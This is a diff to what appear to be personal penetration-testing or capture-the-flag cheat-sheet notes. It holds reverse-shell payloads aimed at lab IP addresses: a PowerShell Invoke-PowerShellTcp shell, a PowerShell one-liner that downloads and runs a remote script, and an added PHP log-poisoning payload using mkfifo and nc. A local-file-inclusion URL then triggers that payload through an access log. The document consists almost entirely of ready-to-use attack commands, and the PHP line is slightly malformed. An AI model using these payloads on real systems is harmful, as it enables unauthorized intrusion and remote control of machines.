@@ -16,4 +16,11 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.23 -Port 443
 powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/Invoke-PowerShellTcp.ps1')
 
 
+#### PHP Reverse Shell 
 
+1. Log Poisoning
+##
+<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 1337)>
+
+##
+source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.14.6%209001%20%3E/tmp/f
